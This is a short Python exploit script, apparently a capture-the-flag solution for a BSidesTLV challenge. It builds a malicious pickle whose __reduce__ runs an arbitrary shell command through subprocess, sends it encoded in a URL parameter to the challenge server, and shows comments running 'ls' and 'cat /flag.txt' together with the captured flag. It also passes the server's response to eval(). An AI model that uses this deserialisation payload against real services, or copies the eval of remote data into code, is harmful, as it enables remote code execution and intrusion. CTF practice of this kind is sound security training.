import pickle
import base64
import requests
import sys
import subprocess
import zlib


class PickleRce(object):
    def __init__(self, command):
        self._command = command

    def __reduce__(self):
        return (subprocess.check_output, (self._command, ))


def to_payload(command):
    return base64.b64encode(zlib.compress(pickle.dumps(PickleRce(command))))


def from_payload(obj):
    return pickle.loads(zlib.decompress(base64.b64decode(obj)))


def send(command):
    return requests.get('http://two.challenges.bsidestlv.com:8088/statusMembers.html?data=' + to_payload(command) + '&format=json')


cmd = sys.argv[1:]
r = send(cmd)
print(eval(r.text))

# depickle.pu ls -l 
# depickle.py ls -l / 
# depickle.py cat /flag.txt -> BSidesTLV{IC0ntr0ll3dP1ckl3R1ck!}
